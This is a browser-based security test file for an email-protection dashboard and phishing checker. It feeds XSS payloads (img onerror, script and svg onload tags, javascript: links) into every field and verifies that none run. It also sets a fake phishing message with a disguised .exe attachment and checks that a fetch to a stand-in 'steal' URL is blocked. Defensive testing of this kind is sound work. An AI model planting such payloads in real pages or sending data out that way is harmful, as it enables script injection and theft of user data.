"""Real-browser XSS test: opens the dashboard and the public checker in Chrome with every piece of
email-derived text replaced by attack code, clicks through every tab, and fails if any of it runs.
Run: python3 tests/xss_browser_test.py   (needs Playwright; uses system Chrome if present)"""
import os, pathlib, shutil, sys
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path(__file__).resolve().parent.parent
P = '<img src=x onerror="window.__xss=1">"><script>window.__xss=2</script><svg onload="window.__xss=3"></svg>'
STUB = r"""
window.__xss = 0;
const P = %s;
const now = Date.now();
const data = {
  apiOverview: { version: P, owner: P, protectionOn: true, checkEveryMinutes: 5, lastCheck: now, dangerous: 1, checkFirst: 1, caughtThisWeek: 2,
                 toReview: 1, websites: 1, scanDone: false, scanCursor: now, alerts: [{ at: now, kind: P, detail: P }] },
  apiQuarantine: { dangerous: [{ id: 'abc123def456', level: 'dangerous', from: P, subject: P, date: now, reasons: P + '; ' + P }], check: [] },
  apiReview: [{ key: 'sender:a@b.com', what: P, why: P, count: '5', examples: P, oldest: now, newest: now, link: 'javascript:window.__xss=4', decision: '', status: P }],
  apiWebsites: [{ site: P, name: P, email: 'a@b.com', type: 'Mailing list', emails: 9, opened: 0, last: now, unsub: 'link', status: P, suggestion: P }],
  apiWebsiteAction: { status: P, link: 'javascript:window.__xss=5' },
  apiOutgoing: { drafts: [{ id: 'r1', to: P, subject: P, date: now - 1e12, old: true }], scheduled: [{ to: P, subject: P, recipients: 3 }],
                 alerts: [{ at: now, kind: P, detail: P }], draftDays: 365 },
  apiSettings: { settings: { checkEveryMinutes: 5, dangerousScore: 70, suspiciousScore: 40, dangerousToSpam: false, promoDays: 30, socialDays: 30,
                 codeDays: 3, draftDays: 365, scanYears: 10, massRecipients: 25, maxSentPerHour: 40, alertEmails: true },
                 keys: { virustotal: P, safebrowsing: '' }, allow: [P], block: ['@x.com'] },
};
function runner(ok) {
  return new Proxy({}, { get(_, name) {
    if (name === 'withSuccessHandler') return (f) => runner(f);
    if (name === 'withFailureHandler') return () => runner(ok);
    return () => setTimeout(() => ok({ ok: true, data: data[name] !== undefined ? data[name] : true }), 0);
  } });
}
window.google = { script: { run: runner(() => {}) } };
""" % repr(P)

failures = []
def check(cond, what):
    print(('PASS ' if cond else 'FAIL ') + what)
    if not cond: failures.append(what)

def chrome(p):
    exe = shutil.which('google-chrome') or shutil.which('chromium')
    return p.chromium.launch(executable_path=exe, args=['--no-sandbox']) if exe else p.chromium.launch()

def page_safe(page, label):
    xss = page.evaluate('window.__xss')
    bad = page.evaluate("""() => document.querySelectorAll('main img, main script, main svg, main iframe, main [onerror], main [onload]').length""")
    hrefs = page.evaluate("""() => Array.from(document.querySelectorAll('a[href]')).map(a => a.getAttribute('href'))""")
    check(xss == 0, f'{label}: no injected code ran')
    check(bad == 0, f'{label}: no injected elements on the page')
    check(all(h.startswith('https://') or (h.startswith('/') and not h.startswith('//')) for h in hrefs),
          f'{label}: every link is https or this same site ({len(hrefs)} links)')

with sync_playwright() as p:
    browser = chrome(p)
    page = browser.new_page()
    dialogs = []
    page.on('dialog', lambda d: (dialogs.append(d.message), d.dismiss()))
    page.add_init_script(STUB)
    page.goto((ROOT / 'src' / 'Dashboard.html').as_uri())
    page.wait_for_timeout(300)
    for tab in ['home', 'quarantine', 'review', 'websites', 'outbox', 'settings']:
        page.click(f'nav button[data-tab="{tab}"]')
        page.wait_for_timeout(250)
        if tab == 'websites':
            page.click('text=All')
            page.wait_for_timeout(150)
            page.click('main button:has-text("Unsubscribe")')
            page.wait_for_timeout(250)
        page_safe(page, 'dashboard/' + tab)
        check('<img src=x onerror=' in page.inner_text('main'), f'dashboard/{tab}: attack text is shown as plain text')
    # show/hide toggle on the secret key field
    key = page.locator('input[aria-label="VirusTotal key"]')
    check(key.get_attribute('type') == 'password', 'settings: API key field is hidden by default')
    page.click('button[aria-label="Show key"] >> nth=0')
    check(key.get_attribute('type') == 'text', 'settings: Show reveals the key you are typing')
    page.click('button[aria-label="Hide key"] >> nth=0')
    check(key.get_attribute('type') == 'password', 'settings: Hide masks it again')
    check(not dialogs, 'dashboard: no alert/confirm dialogs were triggered')

    # The public site, served with the exact headers from vercel.json (minus upgrade-insecure-requests,
    # which would push this local http test server to https).
    import http.server, json, socketserver, threading
    headers = json.load(open(ROOT / 'vercel.json'))['headers'][0]['headers']
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **k): super().__init__(*a, directory=str(ROOT / 'public'), **k)
        def end_headers(self):
            for h in headers:
                v = h['value'].replace('; upgrade-insecure-requests', '') if h['key'] == 'Content-Security-Policy' else h['value']
                self.send_header(h['key'], v)
            super().end_headers()
        def log_message(self, *a): pass
    if (ROOT / 'public' / 'check.html').exists():
        srv = socketserver.TCPServer(('127.0.0.1', 0), Handler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        base = f'http://127.0.0.1:{srv.server_address[1]}'
        page = browser.new_page()
        console = []
        page.on('console', lambda m: console.append(m.text) if m.type == 'error' else None)
        page.on('dialog', lambda d: (dialogs.append(d.message), d.dismiss()))
        page.add_init_script('window.__xss = 0;')
        page.goto(base + '/index.html')
        check(not [c for c in console if 'Content Security Policy' in c], 'site: home page loads with no security-policy errors')
        page.goto(base + '/check.html')
        page.fill('#from', P)
        page.fill('#subject', P)
        page.fill('#body', P + ' Click here to verify your account now: http://185.22.1.9/login')
        page.fill('#attachments', 'invoice.pdf.exe, ' + P)
        page.click('#check')
        page.wait_for_timeout(250)
        page_safe(page, 'checker')
        check('Dangerous' in page.inner_text('#result'), 'checker: a disguised .exe is rated Dangerous')
        check(not [c for c in console if 'Content Security Policy' in c], 'checker: works under the strict security policy')
        sent = page.evaluate("fetch('https://example.com/steal').then(() => 'sent').catch(() => 'blocked')")
        check(sent == 'blocked', 'checker: the page cannot send what you paste anywhere (connect-src none)')
        check(not dialogs, 'checker: no dialogs')
        srv.shutdown()
    else:
        print('SKIP site (run node scripts/build-web.mjs first)')
    browser.close()

print(f'\n{len(failures)} failed')
sys.exit(1 if failures else 0)
